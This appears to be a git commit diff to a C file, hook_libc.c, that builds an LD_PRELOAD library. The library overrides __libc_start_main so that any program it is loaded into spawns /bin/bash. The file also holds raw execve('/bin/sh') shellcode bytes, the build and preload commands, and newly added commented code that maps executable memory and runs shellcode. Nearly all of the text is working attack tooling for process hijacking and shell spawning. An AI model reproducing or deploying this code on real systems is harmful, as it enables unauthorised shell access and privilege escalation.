711b6f9d22980bd41310c7ae4125d618751ee12c
root <root@localhost.localdomain>
2020-04-18 17:51:31 -0500

    Attempted to inject executable shell code and added some pre-built tools in bin.

--- hook_libc.c
+++ hook_libc.c
@@ -1,6 +1,5 @@
 #include <stdlib.h>
 
-
 // Notes
 // gcc -shared -fPIC -ffunction-sections -Wl,--gc-sections -nostdlib hook_lib.c -o hook_lib.so
 // LD_PRELOAD=./hook_lib.so /bin/true
@@ -11,9 +10,16 @@
 // shellcode for execve
 // \xeb\x16\x5f\x48\x31\xc0\x88\x67\x07\x48\x89\x7f\x08\x48\x8d\x77\x08\x48\x8d\x10\xb0\x3b\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 
+// make executable shellcode
+// void *ptr1 = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+// memcpy(ptr1, code, sizeof(code));
+// int (*sc)() = ptr1;
+// sc();
+
 int __libc_start_main(int (*main) (int, char **, char **), int argc, char **ubp_av, void(*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)) {
 	char *const parmList[] = {"/bin/bash", NULL};
 	char *const envParms = {NULL};
 	execve("/bin/bash", parmList, envParms);
+
 	return 0;
 }
